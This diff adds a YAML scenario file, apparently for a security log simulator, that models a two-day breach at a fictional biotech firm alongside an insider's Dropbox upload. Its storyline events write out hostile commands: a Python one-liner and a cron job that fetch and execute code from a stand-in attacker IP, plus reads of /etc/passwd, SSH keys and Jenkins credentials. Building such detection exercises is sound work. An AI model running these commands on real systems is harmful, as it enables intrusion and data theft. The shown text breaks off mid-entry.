@@ -1,0 +1,1419 @@
+version: "1.0"
+name: corporate-breach
+description: |
+  Multi-stage corporate breach at a mid-size biotech firm. An external attacker
+  compromises a developer workstation via a watering-hole attack on a poisoned
+  npm package mirror, pivots through the developer subnet to the R&D network,
+  exfiltrates proprietary research data, and establishes persistent access.
+  Simultaneously, a disgruntled R&D engineer copies sensitive files to a personal
+  cloud storage account via the corporate proxy — an insider threat running in
+  parallel with the external breach. The scenario spans 48 hours across a Tuesday
+  and Wednesday, exercising all log formats, multiple network segments, overlapping
+  sensor visibility, Linux and Windows systems, and every supported event type.
+
+environment:
+  description: >
+    Helix BioSciences — a 35-person biotech company in San Diego, CA. The company
+    develops novel gene therapy delivery mechanisms. The network is segmented into
+    four zones: a DMZ hosting public-facing services, a general business operations
+    subnet, a developer/engineering subnet, and a restricted R&D network with
+    sensitive research systems. Two Zeek sensors provide partially overlapping
+    network visibility, and two Snort IDS sensors monitor the DMZ perimeter and
+    the core network. A forward proxy handles all outbound HTTP/HTTPS traffic
+    from internal subnets. The DMZ web server is exposed to both internal and
+    external traffic, while an internal wiki/intranet server serves only internal
+    users.
+
+  timezone:
+    default: "America/Los_Angeles"
+
+  users:
+    # Executive
+    - username: diana.chen
+      full_name: "Diana Chen"
+      email: diana.chen@helixbio.com
+      persona: executive
+      primary_system: WS-DCHEN
+      groups: [executive, all_staff]
+
+    - username: marcus.webb
+      full_name: "Marcus Webb"
+      email: marcus.webb@helixbio.com
+      persona: executive
+      primary_system: WS-MWEBB
+      groups: [executive, all_staff]
+
+    # Engineering / Developers
+    - username: raj.patel
+      full_name: "Raj Patel"
+      email: raj.patel@helixbio.com
+      persona: developer
+      primary_system: DEV-RPATEL
+      groups: [engineering, all_staff]
+
+    - username: sofia.ruiz
+      full_name: "Sofia Ruiz"
+      email: sofia.ruiz@helixbio.com
+      persona: developer
+      primary_system: DEV-SRUIZ
+      groups: [engineering, all_staff]
+
+    - username: jake.morrison
+      full_name: "Jake Morrison"
+      email: jake.morrison@helixbio.com
+      persona: developer
+      primary_system: DEV-JMORRISON
+      groups: [engineering, all_staff]
+
+    - username: lena.vogt
+      full_name: "Lena Vogt"
+      email: lena.vogt@helixbio.com
+      persona: developer
+      primary_system: DEV-LVOGT
+      groups: [engineering, all_staff]
+
+    # R&D Scientists
+    - username: naveen.gupta
+      full_name: "Naveen Gupta"
+      email: naveen.gupta@helixbio.com
+      persona: data_analyst
+      primary_system: RD-NGUPTA
+      groups: [research, all_staff]
+
+    - username: emily.park
+      full_name: "Emily Park"
+      email: emily.park@helixbio.com
+      persona: data_analyst
+      primary_system: RD-EPARK
+      groups: [research, all_staff]
+
+    - username: carlos.mendoza
+      full_name: "Carlos Mendoza"
+      email: carlos.mendoza@helixbio.com
+      persona: analyst
+      primary_system: RD-CMENDOZA
+      groups: [research, all_staff]
+
+    - username: priya.sharma
+      full_name: "Priya Sharma"
+      email: priya.sharma@helixbio.com
+      persona: data_analyst
+      primary_system: RD-PSHARMA
+      groups: [research, all_staff]
+
+    # IT & Security
+    - username: tom.nakamura
+      full_name: "Tom Nakamura"
+      email: tom.nakamura@helixbio.com
+      persona: sysadmin
+      primary_system: WS-TNAKAMURA
+      groups: [it_ops, domain_admins, all_staff]
+
+    - username: alicia.ford
+      full_name: "Alicia Ford"
+      email: alicia.ford@helixbio.com
+      persona: security_analyst
+      primary_system: WS-AFORD
+      groups: [it_ops, all_staff]
+
+    - username: brian.kelley
+      full_name: "Brian Kelley"
+      email: brian.kelley@helixbio.com
+      persona: help_desk
+      primary_system: WS-BKELLEY
+      groups: [it_ops, all_staff]
+
+    # Business Operations
+    - username: hannah.liu
+      full_name: "Hannah Liu"
+      email: hannah.liu@helixbio.com
+      persona: accountant
+      primary_system: WS-HLIU
+      groups: [finance, all_staff]
+
+    - username: derek.santos
+      full_name: "Derek Santos"
+      email: derek.santos@helixbio.com
+      persona: sales
+      primary_system: WS-DSANTOS
+      groups: [sales_team, all_staff]
+
+    - username: nina.volkov
+      full_name: "Nina Volkov"
+      email: nina.volkov@helixbio.com
+      persona: hr
+      primary_system: WS-NVOLKOV
+      groups: [hr_team, all_staff]
+
+    - username: james.okafor
+      full_name: "James Okafor"
+      email: james.okafor@helixbio.com
+      persona: project_manager
+      primary_system: WS-JOKAFOR
+      groups: [all_staff]
+
+    - username: megan.reilly
+      full_name: "Megan Reilly"
+      email: megan.reilly@helixbio.com
+      persona: marketing
+      primary_system: WS-MREILLY
+      groups: [all_staff]
+
+    - username: victor.tran
+      full_name: "Victor Tran"
+      email: victor.tran@helixbio.com
+      persona: legal_counsel
+      primary_system: WS-VTRAN
+      groups: [legal, all_staff]
+
+    - username: sarah.beck
+      full_name: "Sarah Beck"
+      email: sarah.beck@helixbio.com
+      persona: receptionist
+      primary_system: WS-SBECK
+      groups: [all_staff]
+
+    - username: kevin.cho
+      full_name: "Kevin Cho"
+      email: kevin.cho@helixbio.com
+      persona: intern
+      primary_system: WS-KCHO
+      groups: [engineering, all_staff]
+
+  service_accounts:
+    - svc-backup
+    - svc-monitor
+
+  systems:
+    # === DMZ (10.1.1.0/24) ===
+    - hostname: WEB-EXT
+      ip: "10.1.1.10"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["Nginx", "PHP-FPM", "WordPress"]
+      roles: [web_server]
+
+    - hostname: MAIL-GW
+      ip: "10.1.1.11"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["Postfix", "Dovecot", "SpamAssassin"]
+      roles: [mail_server]
+
+    # === Business Operations (10.1.2.0/24) ===
+    - hostname: WS-DCHEN
+      ip: "10.1.2.10"
+      os: "Windows 11"
+      type: workstation
+      assigned_user: diana.chen
+
+    - hostname: WS-MWEBB
+      ip: "10.1.2.11"
+      os: "Windows 11"
+      type: workstation
+      assigned_user: marcus.webb
+
+    - hostname: WS-HLIU
+      ip: "10.1.2.12"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: hannah.liu
+
+    - hostname: WS-DSANTOS
+      ip: "10.1.2.13"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: derek.santos
+
+    - hostname: WS-NVOLKOV
+      ip: "10.1.2.14"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: nina.volkov
+
+    - hostname: WS-JOKAFOR
+      ip: "10.1.2.15"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: james.okafor
+
+    - hostname: WS-MREILLY
+      ip: "10.1.2.16"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: megan.reilly
+
+    - hostname: WS-VTRAN
+      ip: "10.1.2.17"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: victor.tran
+
+    - hostname: WS-SBECK
+      ip: "10.1.2.18"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: sarah.beck
+
+    - hostname: WS-KCHO
+      ip: "10.1.2.19"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: kevin.cho
+
+    - hostname: WS-TNAKAMURA
+      ip: "10.1.2.20"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: tom.nakamura
+
+    - hostname: WS-AFORD
+      ip: "10.1.2.21"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: alicia.ford
+
+    - hostname: WS-BKELLEY
+      ip: "10.1.2.22"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: brian.kelley
+
+    # === Developer / Engineering (10.1.3.0/24) ===
+    - hostname: DEV-RPATEL
+      ip: "10.1.3.10"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: raj.patel
+
+    - hostname: DEV-SRUIZ
+      ip: "10.1.3.11"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: sofia.ruiz
+
+    - hostname: DEV-JMORRISON
+      ip: "10.1.3.12"
+      os: "macOS 14"
+      type: workstation
+      assigned_user: jake.morrison
+
+    - hostname: DEV-LVOGT
+      ip: "10.1.3.13"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: lena.vogt
+
+    - hostname: BUILD-01
+      ip: "10.1.3.50"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["Jenkins", "Docker"]
+
+    - hostname: INTRANET-01
+      ip: "10.1.3.51"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["Nginx", "MediaWiki"]
+      roles: [web_server]
+
+    # === R&D Network (10.1.4.0/24) ===
+    - hostname: RD-NGUPTA
+      ip: "10.1.4.10"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: naveen.gupta
+
+    - hostname: RD-EPARK
+      ip: "10.1.4.11"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: emily.park
+
+    - hostname: RD-CMENDOZA
+      ip: "10.1.4.12"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: carlos.mendoza
+
+    - hostname: RD-PSHARMA
+      ip: "10.1.4.13"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: priya.sharma
+
+    - hostname: RD-DATA-01
+      ip: "10.1.4.50"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["PostgreSQL", "JupyterHub"]
+
+    - hostname: RD-NAS-01
+      ip: "10.1.4.51"
+      os: "Linux (Synology DSM)"
+      type: server
+      services: ["NFS", "SMB", "SFTP"]
+
+    # === Core Infrastructure (10.1.5.0/24) ===
+    - hostname: DC-01
+      ip: "10.1.5.10"
+      os: "Windows Server 2022"
+      type: domain_controller
+      services: ["Active Directory", "DNS", "DHCP"]
+      roles: [dns_server]
+
+    - hostname: DC-02
+      ip: "10.1.5.11"
+      os: "Windows Server 2022"
+      type: domain_controller
+      services: ["Active Directory", "DNS"]
+      roles: [dns_server]
+
+    - hostname: FS-01
+      ip: "10.1.5.12"
+      os: "Windows Server 2022"
+      type: server
+      services: ["File Shares", "DFS"]
+
+    - hostname: PROXY-01
+      ip: "10.1.5.20"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["Squid"]
+      roles: [forward_proxy]
+
+  groups:
+    - name: all_staff
+      members:
+        - diana.chen
+        - marcus.webb
+        - raj.patel
+        - sofia.ruiz
+        - jake.morrison
+        - lena.vogt
+        - naveen.gupta
+        - emily.park
+        - carlos.mendoza
+        - priya.sharma
+        - tom.nakamura
+        - alicia.ford
+        - brian.kelley
+        - hannah.liu
+        - derek.santos
+        - nina.volkov
+        - james.okafor
+        - megan.reilly
+        - victor.tran
+        - sarah.beck
+        - kevin.cho
+
+    - name: executive
+      members: [diana.chen, marcus.webb]
+
+    - name: engineering
+      members: [raj.patel, sofia.ruiz, jake.morrison, lena.vogt, kevin.cho]
+
+    - name: research
+      members: [naveen.gupta, emily.park, carlos.mendoza, priya.sharma]
+
+    - name: it_ops
+      members: [tom.nakamura, alicia.ford, brian.kelley]
+
+    - name: domain_admins
+      members: [tom.nakamura]
+
+    - name: finance
+      members: [hannah.liu]
+
+    - name: sales_team
+      members: [derek.santos]
+
+    - name: hr_team
+      members: [nina.volkov]
+
+    - name: legal
+      members: [victor.tran]
+
+  network:
+    segments:
+      - name: dmz
+        cidr: "10.1.1.0/24"
+        description: "DMZ — public web server and mail gateway"
+        exposure: both
+        systems: [WEB-EXT, MAIL-GW]
+
+      - name: business
+        cidr: "10.1.2.0/24"
+        description: "Business operations — general staff workstations"
+        systems:
+          - WS-DCHEN
+          - WS-MWEBB
+          - WS-HLIU
+          - WS-DSANTOS
+          - WS-NVOLKOV
+          - WS-JOKAFOR
+          - WS-MREILLY
+          - WS-VTRAN
+          - WS-SBECK
+          - WS-KCHO
+          - WS-TNAKAMURA
+          - WS-AFORD
+          - WS-BKELLEY
+
+      - name: engineering
+        cidr: "10.1.3.0/24"
+        description: "Developer and engineering workstations, build server, intranet"
+        exposure: internal
+        systems:
+          - DEV-RPATEL
+          - DEV-SRUIZ
+          - DEV-JMORRISON
+          - DEV-LVOGT
+          - BUILD-01
+          - INTRANET-01
+
+      - name: research
+        cidr: "10.1.4.0/24"
+        description: "R&D network — research workstations, data server, NAS"
+        systems:
+          - RD-NGUPTA
+          - RD-EPARK
+          - RD-CMENDOZA
+          - RD-PSHARMA
+          - RD-DATA-01
+          - RD-NAS-01
+
+      - name: core
+        cidr: "10.1.5.0/24"
+        description: "Core infrastructure — domain controllers, file server, proxy"
+        systems:
+          - DC-01
+          - DC-02
+          - FS-01
+          - PROXY-01
+
+    sensors:
+      # Zeek sensor 1: monitors business + engineering + core (not R&D, not DMZ)
+      - type: network
+        name: zeek-internal
+        hostname: ZEEK-INT
+        monitoring_segments: [business, engineering, core]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+
+      # Zeek sensor 2: monitors engineering + research + core (overlaps on engineering+core)
+      - type: network
+        name: zeek-research
+        hostname: ZEEK-RD
+        monitoring_segments: [engineering, research, core]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+
+      # Snort IDS 1: DMZ perimeter — tap placement, only cross-segment traffic
+      - type: ids
+        name: snort-dmz
+        hostname: IDS-DMZ
+        monitoring_segments: [dmz]
+        direction: bidirectional
+        placement: tap
+        log_formats: [snort_alert]
+
+      # Snort IDS 2: core network — span placement, maximum internal visibility
+      - type: ids
+        name: snort-core
+        hostname: IDS-CORE
+        monitoring_segments: [business, engineering, research, core]
+        direction: bidirectional
+        placement: span
+        log_formats: [snort_alert]
+
+personas:
+  - name: developer
+    description: "Software engineer who writes code, runs builds, and uses version control frequently"
+    typical_activities:
+      - "Write and edit source code"
+      - "Run builds and tests"
+      - "Push/pull from git repositories"
+      - "Browse documentation and Stack Overflow"
+      - "SSH into build servers"
+    work_hours: "9am-6pm (lunch 12pm-1pm)"
+    application_usage: ["VS Code", "Terminal", "Chrome", "Docker", "Git"]
+    risk_profile: "high"
+
+  - name: data_analyst
+    description: "Research scientist who runs computational experiments, queries databases, and analyzes results in Jupyter notebooks"
+    typical_activities:
+      - "Run Python/R scripts for data analysis"
+      - "Query PostgreSQL databases for experimental data"
+      - "Build models in Jupyter notebooks"
+      - "Transfer data files between NAS and workstation"
+    work_hours: "8am-7pm (lunch 12pm-1pm)"
+    application_usage: ["Python", "Jupyter", "R", "PostgreSQL Client", "Chrome"]
+    risk_profile: "medium"
+
+  - name: analyst
+    description: "Research analyst who reviews experimental results, writes reports, and collaborates on shared drives"
+    typical_activities:
+      - "Review experimental data and results"
+      - "Write and edit research reports"
+      - "Access shared drives for collaboration"
+      - "Browse scientific literature"
+    work_hours: "8am-5pm (lunch 12pm-1pm)"
+    application_usage: ["Excel", "Chrome", "Word", "Outlook"]
+    risk_profile: "medium"
+
+  - name: executive
+    description: "C-level executive focused on strategic communication, investor relations, and document review"
+    typical_activities:
+      - "Review and send executive correspondence"
+      - "Attend board and leadership meetings"
+      - "Review strategic documents and reports"
+    work_hours: "7am-7pm (lunch 12pm-1pm)"
+    application_usage: ["Outlook", "Chrome", "Teams", "Word", "PowerPoint"]
+    risk_profile: "low"
+
+  - name: sysadmin
+    description: "System administrator managing servers, AD, and network infrastructure via remote access and scripting"
+    typical_activities:
+      - "Monitor and maintain server infrastructure"
+      - "Execute PowerShell and Bash scripts for automation"
+      - "Manage user accounts and group policies"
+      - "RDP to Windows servers, SSH to Linux servers"
+      - "Apply patches and security updates"
+    work_hours: "8am-6pm (lunch 12pm-1pm)"
+    application_usage: ["PowerShell", "Remote Desktop", "SSH", "Event Viewer"]
+    risk_profile: "high"
+
+  - name: security_analyst
+    description: "SOC analyst monitoring security events, investigating alerts, and tuning detection rules"
+    typical_activities:
+      - "Monitor SIEM dashboards"
+      - "Investigate suspicious network traffic"
+      - "Write and tune detection rules"
+    work_hours: "9am-5pm (lunch 12pm-1pm)"
+    application_usage: ["Splunk", "Wireshark", "Chrome", "Terminal"]
+    risk_profile: "high"
+
+  - name: help_desk
+    description: "IT support specialist resolving tickets and providing remote assistance"
+    typical_activities:
+      - "Respond to support tickets"
+      - "Provide remote desktop assistance"
+      - "Reset passwords and manage accounts"
+    work_hours: "8am-5pm (lunch 12pm-1pm)"
+    application_usage: ["Ticketing System", "Remote Desktop", "Chrome", "AD"]
+    risk_profile: "medium"
+
+  - name: accountant
+    description: "Finance professional managing financial records and reconciling accounts"
+    typical_activities:
+      - "Process invoices and expense reports"
+      - "Reconcile accounts and ledgers"
+      - "Prepare financial statements"
+    work_hours: "8am-5pm (lunch 12pm-1pm)"
+    application_usage: ["QuickBooks", "Excel", "Chrome", "Outlook"]
+    risk_profile: "low"
+
+  - name: sales
+    description: "Sales representative managing client relationships and CRM"
+    typical_activities:
+      - "Update CRM with deal progress"
+      - "Send outreach emails"
+      - "Conduct video calls with prospects"
+    work_hours: "8am-6pm (lunch 12pm-1pm)"
+    application_usage: ["Salesforce", "Outlook", "Chrome", "Teams"]
+    risk_profile: "low"
+
+  - name: hr
+    description: "HR professional managing employee records and onboarding"
+    typical_activities:
+      - "Review and process employee records"
+      - "Coordinate interviews and onboarding"
+      - "Manage benefits enrollment"
+    work_hours: "9am-5pm (lunch 12pm-1pm)"
+    application_usage: ["Workday", "Outlook", "Chrome", "Teams"]
+    risk_profile: "low"
+
+  - name: project_manager
+    description: "Project manager tracking deliverables and coordinating teams"
+    typical_activities:
+      - "Update project boards and tickets"
+      - "Facilitate meetings"
+      - "Track milestones"
+    work_hours: "8am-6pm (lunch 12pm-1pm)"
+    application_usage: ["Jira", "Outlook", "Teams", "Chrome"]
+    risk_profile: "low"
+
+  - name: marketing
+    description: "Marketing professional creating campaigns and analyzing web metrics"
+    typical_activities:
+      - "Design marketing campaigns"
+      - "Analyze website traffic"
+      - "Manage social media"
+    work_hours: "9am-6pm (lunch 12pm-1pm)"
+    application_usage: ["Chrome", "Slack", "Canva", "Google Analytics"]
+    risk_profile: "low"
+
+  - name: legal_counsel
+    description: "Legal counsel reviewing contracts and managing compliance"
+    typical_activities:
+      - "Review and redline contracts"
+      - "Research regulatory requirements"
+      - "Manage document signing workflows"
+    work_hours: "8am-6pm (lunch 12pm-1pm)"
+    application_usage: ["DocuSign", "Outlook", "Chrome", "Word"]
+    risk_profile: "low"
+
+  - name: receptionist
+    description: "Front desk receptionist managing calls, visitors, and scheduling"
+    typical_activities:
+      - "Manage incoming phone calls"
+      - "Register and direct visitors"
+      - "Schedule conference rooms"
+    work_hours: "8am-5pm (lunch 12pm-1pm)"
+    application_usage: ["Phone System", "Outlook", "Chrome"]
+    risk_profile: "low"
+
+  - name: intern
+    description: "Engineering intern performing basic development tasks and learning processes"
+    typical_activities:
+      - "Complete assigned coding tasks"
+      - "Attend training sessions"
+      - "Write documentation"
+    work_hours: "9am-5pm (lunch 12pm-1pm)"
+    application_usage: ["VS Code", "Chrome", "Terminal"]
+    risk_profile: "low"
+
+time_window:
+  start: "2024-06-11T14:00:00Z"
+  duration: "48h"
+
+baseline_activity:
+  description: >
+    Normal weekday activity for a biotech company. Developers write code and SSH
+    to build servers. R&D scientists run Jupyter notebooks and query PostgreSQL.
+    Business staff handle email, spreadsheets, and web browsing. IT staff manage
+    infrastructure via RDP and SSH. All outbound web traffic routes through the
+    corporate proxy. Activity concentrated during business hours (7am-7pm PDT /
+    14:00-02:00 UTC) with minimal overnight.
+  intensity: medium
+  variation: medium
+
+storyline:
+  # ============================================================
+  # THREAD A — EXTERNAL BREACH: Watering Hole → Dev → R&D
+  # ============================================================
+
+  # --- Watering hole: Raj visits poisoned npm mirror, downloads trojanized package ---
+  - time: "+3h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: >
+      Raj Patel runs npm install for a project dependency. The corporate npm mirror
+      (npm-mirror.helix-cdn.com) has been poisoned — the lodash-utils package contains
+      a postinstall script that downloads and executes a Python reverse shell.
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 443
+        service: "ssl"
+        technique: "T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain"
+        description: "npm install fetches trojanized package from poisoned mirror via HTTPS"
+      - type: process
+        process_name: "/usr/bin/node"
+        command_line: "node /home/raj.patel/projects/helix-api/node_modules/lodash-utils/scripts/postinstall.js"
+        technique: "T1204.002 - User Execution: Malicious File"
+        description: "npm postinstall script executes malicious JavaScript payload"
+
+  # --- Reverse shell established ---
+  - time: "+3h1m"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: >
+      Postinstall script downloads Python reverse shell from C2 and executes it.
+      Shell connects back to attacker infrastructure over HTTPS on port 8443.
+    events:
+      - type: process
+        process_name: "/usr/bin/python3"
+        command_line: "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"https://203.0.113.80:8443/s\").read())'"
+        technique: "T1059.006 - Command and Scripting Interpreter: Python"
+        description: "Python reverse shell downloaded and executed in memory"
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1571 - Non-Standard Port"
+        description: "Reverse shell connects to C2 over HTTPS on non-standard port 8443"
+
+  # --- Local reconnaissance on dev workstation ---
+  - time: "+3h5m"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Local reconnaissance — enumerate current user and system info"
+    events:
+      - type: process
+        process_name: "/usr/bin/id"
+        command_line: "id"
+        technique: "T1033 - System Owner/User Discovery"
+      - type: process
+        process_name: "/usr/bin/uname"
+        command_line: "uname -a"
+        technique: "T1082 - System Information Discovery"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/passwd"
+        technique: "T1087.001 - Account Discovery: Local Account"
+
+  - time: "+3h7m"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Network reconnaissance — scan local subnet and identify other hosts"
+    events:
+      - type: process
+        process_name: "/usr/bin/ip"
+        command_line: "ip addr show"
+        technique: "T1016 - System Network Configuration Discovery"
+      - type: process
+        process_name: "/usr/bin/arp"
+        command_line: "arp -a"
+        technique: "T1018 - Remote System Discovery"
+
+  # --- SSH key theft and lateral movement to build server ---
+  - time: "+3h15m"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Steal SSH keys from developer's home directory for lateral movement"
+    events:
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /home/raj.patel/.ssh/id_ed25519"
+        technique: "T1552.004 - Unsecured Credentials: Private Keys"
+        description: "Read SSH private key for lateral movement"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /home/raj.patel/.ssh/known_hosts"
+        technique: "T1018 - Remote System Discovery"
+        description: "Read known_hosts to identify SSH targets"
+
+  - time: "+3h20m"
+    actor: raj.patel
+    system: BUILD-01
+    activity: "Lateral movement — SSH from dev workstation to build server using stolen key"
+    events:
+      - type: ssh_session
+        source_ip: "10.1.3.10"
+        technique: "T1021.004 - Remote Services: SSH"
+        description: "SSH lateral movement from DEV-RPATEL to BUILD-01 using stolen key"
+
+  # --- Build server recon: find credentials for R&D network ---
+  - time: "+3h25m"
+    actor: raj.patel
+    system: BUILD-01
+    activity: "Search build server for credentials and configuration files"
+    events:
+      - type: process
+        process_name: "/usr/bin/find"
+        command_line: "find /opt/jenkins -name '*.xml' -exec grep -l password {} \\;"
+        technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+        description: "Search Jenkins configs for embedded credentials"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /opt/jenkins/credentials.xml"
+        technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+        description: "Read Jenkins credentials file containing R&D database creds"
+
+  # --- C2 beacon from dev workstation ---
+  - time: "+5h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Periodic C2 beacon check-in"
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  # --- Pivot to R&D: SSH to research data server using stolen Jenkins creds ---
+  - time: "+5h10m"
+    actor: raj.patel
+    system: RD-DATA-01
+    activity: >
+      Lateral movement from build server to R&D data server. Attacker uses
+      svc-backup service account credentials found in Jenkins config to SSH
+      into the PostgreSQL/JupyterHub server.
+    events:
+      - type: ssh_session
+        source_ip: "10.1.3.50"
+        technique: "T1021.004 - Remote Services: SSH"
+        description: "SSH pivot from BUILD-01 to RD-DATA-01 using svc-backup credentials"
+
+  # --- R&D data server recon ---
+  - time: "+5h15m"
+    actor: raj.patel
+    system: RD-DATA-01
+    activity: "Enumerate R&D data server — databases, files, running services"
+    events:
+      - type: process
+        process_name: "/usr/bin/ps"
+        command_line: "ps aux"
+        technique: "T1057 - Process Discovery"
+      - type: process
+        process_name: "/usr/bin/ss"
+        command_line: "ss -tlnp"
+        technique: "T1049 - System Network Connections Discovery"
+      - type: process
+        process_name: "/usr/bin/df"
+        command_line: "df -h"
+        technique: "T1082 - System Information Discovery"
+
+  # --- Database enumeration and data theft ---
+  - time: "+5h30m"
+    actor: raj.patel
+    system: RD-DATA-01
+    activity: "Query PostgreSQL for gene therapy research data"
+    events:
+      - type: process
+        process_name: "/usr/bin/psql"
+        command_line: "psql -U svc-backup -d helix_research -c '\\dt'"
+        technique: "T1213 - Data from Information Repositories"
+        description: "List tables in research database"
+      - type: connection
+        dst_ip: "10.1.4.50"
+        dst_port: 5432
+        service: "postgresql"
+        source_ip: "10.1.4.50"
+        technique: "T1213 - Data from Information Repositories"
+        description: "Local PostgreSQL connection for data enumeration"
+
+  - time: "+5h35m"
+    actor: raj.patel
+    system: RD-DATA-01
+    activity: "Dump gene therapy experiment results to CSV for exfiltration"
+    events:
+      - type: process
+        process_name: "/usr/bin/psql"
+        command_line: "psql -U svc-backup -d helix_research -c \"COPY (SELECT * FROM experiment_results WHERE project='GT-7700') TO '/tmp/.cache/results.csv' WITH CSV HEADER\""
+        technique: "T1005 - Data from Local System"
+        description: "Export proprietary gene therapy research data to CSV"
+
+  # --- Stage and exfiltrate data ---
+  - time: "+5h45m"
+    actor: raj.patel
+    system: RD-DATA-01
+    activity: "Compress and exfiltrate research data over HTTPS to C2"
+    events:
+      - type: process
+        process_name: "/usr/bin/tar"
+        command_line: "tar czf /tmp/.cache/data.tar.gz -C /tmp/.cache results.csv"
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1041 - Exfiltration Over C2 Channel"
+        description: "Exfiltrate compressed research data to C2 server"
+
+  # --- Persistence: cron job on R&D data server ---
+  - time: "+5h50m"
+    actor: raj.patel
+    system: RD-DATA-01
+    activity: "Establish persistence via cron job disguised as log rotation"
+    events:
+      - type: process
+        process_name: "/usr/bin/crontab"
+        command_line: "crontab -l | { cat; echo '0 */6 * * * /usr/bin/python3 -c \"import urllib.request;exec(urllib.request.urlopen(\\\"https://203.0.113.80:8443/s\\\").read())\" >/dev/null 2>&1'; } | crontab -"
+        technique: "T1053.003 - Scheduled Task/Job: Cron"
+        description: "Persistent cron job reconnects to C2 every 6 hours"
+
+  # --- C2 beacons (afternoon/evening Day 1) ---
+  - time: "+8h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Periodic C2 beacon"
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  - time: "+11h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "Periodic C2 beacon"
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
+        service: "ssl"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  # ============================================================
+  # THREAD B — INSIDER THREAT: Carlos exfiltrates to personal cloud
+  # ============================================================
+
+  # --- Carlos accesses R&D NAS and copies sensitive files ---
+  - time: "+4h"
+    actor: carlos.mendoza
+    system: RD-CMENDOZA
+    activity: "Carlos accesses R&D NAS to browse proprietary formulation data"
+    events:
+      - type: connection
+        dst_ip: "10.1.4.51"
+        dst_port: 445
+        service: "smb"
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "SMB connection from R&D workstation to NAS for file browsing"
+
+  - time: "+4h10m"
+    actor: carlos.mendoza
+    system: RD-CMENDOZA
+    activity: "Carlos copies proprietary formulation documents to local disk"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\robocopy.exe"
+        command_line: "robocopy \\\\RD-NAS-01\\Formulations\\GT-7700 C:\\Users\\carlos.mendoza\\Documents\\backup /E /COPY:DAT"
+        technique: "T1005 - Data from Local System"
+        description: "Bulk copy of proprietary gene therapy formulation data"
+
+  # --- Carlos compresses and uploads via proxy to personal cloud ---
+  - time: "+4h30m"
+    actor: carlos.mendoza
+    system: RD-CMENDOZA
+    activity: "Carlos compresses files and prepares for exfiltration"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -c \"Compress-Archive -Path 'C:\\Users\\carlos.mendoza\\Documents\\backup\\*' -DestinationPath 'C:\\Users\\carlos.mendoza\\Documents\\formulations.zip' -Force\""
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+
+  - time: "+4h40m"
+    actor: carlos.mendoza
+    system: RD-CMENDOZA
+    activity: >
+      Carlos uploads compressed formulation data to personal Dropbox via
+      the corporate proxy. This is the insider exfiltration — legitimate user,
+      legitimate proxy path, but unauthorized data transfer to personal cloud.
+    events:
+      - type: connection
+        dst_ip: "162.125.66.1"
+        dst_port: 443
+        service: "ssl"
+        technique: "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+        description: "Upload to Dropbox via corporate proxy — insider exfiltration"
+
+  # ============================================================
+  # DAY 2 — WEDNESDAY: Deeper compromise + cover tracks
+  # ============================================================
+
+  # --- Attacker returns, pivots to Windows R&D workstation ---
+  - time: "+27h"
+    actor: raj.patel
+    system: DEV-RPATEL
+    activity: "C2 beacon — attacker re-engages Wednesday morning"
+    events:
+      - type: connection
+        dst_ip: "203.0.113.80"
+        dst_port: 8443
